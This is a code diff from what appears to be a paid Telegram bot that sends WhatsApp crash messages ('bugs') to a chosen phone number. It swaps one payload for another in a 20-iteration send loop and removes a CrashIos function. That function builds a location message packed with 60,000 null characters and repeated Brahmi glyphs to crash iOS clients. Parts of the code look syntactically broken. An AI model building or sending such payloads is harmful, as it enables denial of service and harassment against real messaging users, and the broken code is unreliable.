@@ -1560,7 +1560,7 @@ bot.command(["corios"], checkWhatsAppConnection, checkPremium, async (ctx) => {
 
   (async () => {
     for (let i = 0; i < 20; i++) {
-      await CrashIos(sock, target);
+      await stardustdelay16(sock, target);
       await sleep(1000);
       console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
     }
@@ -3969,57 +3969,6 @@ async function DelayOneHittV1(sock, target) {
     }
 }
 
-async function CrashIos(sock, target) {
-  const rexzy = {
-    locationMessage: {
-      degreesLatitude: 21.1266,
-      degreesLongitude: -11.8199,
-      name: "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
-      url: null,
-      contextInfo: {
-        externalAdReply: {
-          quotedAd: {
-            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
-            mediaType: "IMAGE",
-            jpegThumbnail: null,
-            caption: "@rexzyofficial" + "𑇂𑆵𑆴𑆿".repeat(60000)
-          },
-          placeholderKey: {
-            remoteJid: "0@s.whatsapp.net",
-            fromMe: false,
-            id: "ABCDEF1234567890"
-          }
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage("status@broadcast", rexzy, {
-    messageId: "3EB0" + Math.random().toString(36).substring(2, 15).toUpperCase();,
-    statusJidList: [target],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: target,
-                content: undefined
-              }
-            ]
-          }
-        ]
-      }
-    ]
-  });
-  console.log(`\x1b[36m─────「 Succes Kirim Bug To: ${target}!⏤ 」─────\x1b[0m`);
-}
-
 async function stardustdelay16(sock, target) {
 await sock.relayMessage(target, {
     groupStatusMessageV2: {
@@ -4109,8 +4058,6 @@ await sock.relayMessage(target, {
        }
      }, { participant: { jid: target }});
    }
- }
-}
 
 async function anomoyusOneHit(sock, target) {
   const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
